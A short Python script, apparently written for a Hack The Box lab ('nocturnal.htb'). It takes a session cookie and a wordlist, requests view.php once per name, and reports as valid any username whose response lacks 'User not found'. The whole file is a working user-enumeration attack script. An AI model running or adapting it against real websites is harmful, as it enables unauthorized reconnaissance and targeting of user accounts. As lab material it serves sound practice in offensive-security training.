#!/usr/bin/python3

import requests
import argparse

parser = argparse.ArgumentParser(description="Fetch usernames from a file and make requests")
parser.add_argument("session", help="the PHPSESSID cookie value")
parser.add_argument("wordlist", help="path to username file")
parser.add_argument("--url", help="target address", default="http://nocturnal.htb/view.php")

args = parser.parse_args()

with open(args.wordlist, "r") as file:
    usernames = [line.strip() for line in file]

cookies = {"PHPSESSID": args.session}

for username in usernames:
    params = {"username": username, "file": "dne.pdf"}
    response = requests.get(args.url, params=params, cookies=cookies)
    if "User not found" not in response.text:
        print(f"Valid Username: {username}")
